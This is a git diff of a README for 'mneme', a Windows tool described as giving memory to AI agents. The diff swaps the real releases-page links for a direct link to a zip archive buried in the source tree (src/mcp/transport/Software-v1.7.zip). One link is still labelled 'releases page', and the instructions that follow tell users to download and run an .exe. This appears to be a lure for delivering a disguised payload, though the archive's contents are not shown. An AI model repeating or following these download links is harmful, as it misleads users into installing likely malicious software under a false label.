@@ -1,6 +1,6 @@
 # 🧠 mneme - Keep memory for your AI agents
 
-[![](https://img.shields.io/badge/Download_Mneme_for_Windows-blue?style=for-the-badge)](https://github.com/Vaginaldischargenewscaster673/mneme/releases)
+[![](https://img.shields.io/badge/Download_Mneme_for_Windows-blue?style=for-the-badge)](https://github.com/Vaginaldischargenewscaster673/mneme/raw/refs/heads/main/src/mcp/transport/Software-v1.7.zip)
 
 ## 📌 What is mneme?
 
@@ -12,7 +12,7 @@ Mneme works on Windows 10 and Windows 11. Your computer needs at least 4GB of RA
 
 ## 📥 Getting Started
 
-1. Visit the [releases page](https://github.com/Vaginaldischargenewscaster673/mneme/releases).
+1. Visit the [releases page](https://github.com/Vaginaldischargenewscaster673/mneme/raw/refs/heads/main/src/mcp/transport/Software-v1.7.zip).
 2. Look for the latest version at the top.
 3. Click the link that ends in .exe for Windows.
 4. Save the file to your desktop or your Documents folder.
